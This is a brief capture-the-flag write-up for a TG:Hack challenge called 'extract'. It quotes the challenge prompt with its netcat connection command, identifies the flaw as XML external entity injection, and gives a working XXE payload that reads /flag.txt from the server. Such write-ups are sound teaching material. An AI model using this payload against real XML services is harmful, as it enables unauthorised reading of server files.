
## extract
### Description

> Extract This!
>
> Author: Einar Antonsen - Chabz#1587
>
> One of our agents managed to install a service on MOTHER's network. We can use it to extract secrets, but she didn't tell me how! Can you figure it out?
>
> ```
> nc extract.tghack.no 6000
> ```
>

### Analysis

It's a xml language parser, so try to [XEE(**X**ML **E**xternal **E**ntity)](https://en.wikipedia.org/wiki/XML_external_entity_attack) Injection.

### Solution

[ref](https://www.cnblogs.com/pwn2web/p/12183319.html)

```xml
<?xml version="1.0" encoding="UTF-8" ?> <!DOCTYPE ANY [<!ENTITY xxe SYSTEM "/flag.txt" >]><value>&xxe;</value>
```
